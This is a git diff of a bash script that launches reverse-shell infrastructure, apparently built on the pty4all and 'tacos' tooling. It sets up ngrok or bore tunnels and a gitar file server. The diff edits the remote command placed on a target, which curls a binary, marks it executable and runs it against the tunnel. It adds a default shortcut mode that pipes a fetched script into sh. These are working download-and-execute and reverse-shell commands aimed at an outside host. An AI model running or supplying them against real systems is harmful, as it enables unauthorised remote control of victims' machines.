@@ -2,6 +2,8 @@
 
 # From https://github.com/laluka/pty4all
 
+SHORTCUT=true
+
 for i in "$@"; do
     case $i in
     --lport|-p)
@@ -19,8 +21,8 @@ for i in "$@"; do
     --windows|-w)
         WINDOWS=true
         ;;
-    --++|--aas)
-        AAS=true
+    --no-shortcuts|-N)
+        SHORTCUT="" # ~ setting at false
         ;;
     --help|-h)
         HELP=true
@@ -87,7 +89,7 @@ if [[ $NGROK ]]; then
     ## launch ngrok
     echo "[+] Launch bore tunneling"
     tmux split-window -v "ngrok tcp ${WEBPORT}"
-    sleep 3 # wait for ngrok to start
+    sleep 4 # wait for ngrok to start
     NGROK_ENDPOINT_TCP=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | jq -r ".tunnels[0].public_url")
     # NGROK_ENDPOINT="http:$(echo $NGROK_ENDPOINT_TCP | cut -d ":" -f 2-3)"
     NGROK_ENDPOINT="$(echo $NGROK_ENDPOINT_TCP | cut -d ':' -f 2-3 | cut -d '/' -f 3-)"
@@ -104,19 +106,21 @@ else
     NGROK_ENDPOINT_TCP = "${BORE_ENDPOINT}"
 fi
 
-#gitar shortcut + launch gitar
+#launch gitar
 echo "[+] launch gitar server"
 SECRET=$RANDOM
 tmux split-window -h "gitar -a https://${TUNNEL_ENDPOINT} -f ${LPORT} --secret ${SECRET}"   # https??
 URL="http://${TUNNEL_ENDPOINT}/${SECRET}"
 
-
-if [[ ! $WINDOWS ]]; then
-    echo "[+] gitar shortcuts enabled on reverse shell"
-    sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
-    URL_WITHOUT_SLASH=$(echo "$URL" | tr / ~)
-    sed -i "s,GITAR_HOST,${URL},g" ${SCRIPT}  #Fix, I need -a and not -e    # Use another delimeter for sed to have / in url
-fi
+## gitar shortcut are not possible as we will call shutdown on gitar (=> no more http server)
+# disable gitar shortcut
+sed -i "/GITAR_SECRET/d" ${SCRIPT}
+# if [[ ! $WINDOWS ]]; then
+#     echo "[+] gitar shortcuts enabled on reverse shell"
+#     sed -i "s/GITAR_PORT/${WEBPORT}/g" ${SCRIPT}
+#     URL_WITHOUT_SLASH=$(echo "$URL" | tr / ~)
+#     sed -i "s,GITAR_HOST,${URL},g" ${SCRIPT}  #Fix, I need -a and not -e    # Use another delimeter for sed to have / in url
+# fi
 
 # put tacos in current directory
 PWD=$(pwd)
@@ -138,18 +142,20 @@ SHUTDOWN_URL="${URL}/shutdown"
 
 # LISTEN
 REMOTE_CMD=""
+
 if [[ "$WINDOWS" ]]; then
     REMOTE_CMD="curl -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && .\\${BINARY} ${TUNNEL_ENDPOINT}"
 else
     REMOTE_CMD="curl -s -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && chmod +x ${BINARY} && ./${BINARY} ${TUNNEL_ENDPOINT}"
 fi
 
-## as a Service? ie even shorter shortcut
-if [[ "$AAS" ]]; then
+## with shorter shortcut?
+if [[ "$SHORTCUT" ]]; then
     ## Write file for gitar
-    echo "${REMOTE_CMD}" > aas
-    AAS_URL="${URL}/pull/aas"
-    REMOTE_CMD="\ncurl ${AAS_URL} |sh\nsh -c \"\$(curl ${AAS_URL})\"\nsh <(curl ${AAS_URL})"
+    echo "${REMOTE_CMD}" > sh
+    SHORTCUT_URL="${URL}/pull/sh"
+    REMOTE_CMD="\nsh -c \"\$(curl ${SHORTCUT_URL})\"\nsh <(curl ${SHORTCUT_URL})"
+    #curl ${SHORTCUT_URL} |sh\n does not work due to /pkg/tacos/tacos.go:94
 fi
 
 echo
